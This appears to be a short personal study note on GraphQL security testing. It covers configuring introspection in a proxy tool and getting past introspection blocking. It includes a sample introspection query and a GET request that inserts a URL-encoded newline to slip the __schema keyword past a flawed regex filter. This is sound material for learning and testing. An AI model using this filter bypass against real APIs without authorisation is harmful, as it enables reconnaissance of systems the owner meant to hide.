____

GraphQL -> Set instrospection query
GraphQL -> Save GraphQL queries to sitemap

![[Pasted image 20250124190634.png]]

____

When developers disable introspection, they could use a regex to exclude the `__schema` keyword in queries. You should try characters like spaces, new lines and commas, as they are ignored by GraphQL but not by flawed regex.

```json
{ "query": "query{__schema {queryType{name}}}" }
```

Try a GET request, or a POST request with a content-type of `x-www-form-urlencoded`

```
GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
```

![[Pasted image 20250124191855.png]]

Add `%0a` --> \n

![[Pasted image 20250124191926.png]]

![[Pasted image 20250124192136.png]]

